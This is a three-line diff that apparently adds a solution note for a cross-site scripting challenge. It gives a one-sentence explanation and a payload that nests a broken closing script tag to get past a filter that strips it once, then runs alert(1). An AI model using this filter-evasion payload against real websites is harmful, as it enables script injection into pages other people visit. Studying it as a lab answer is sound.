@@ -1,0 +1,3 @@
+What we are doing here is bypassing the <script> tag, allowing us to easily inject code.
+
+Solution Code= </scr</scriptipt><script>alert(1)//
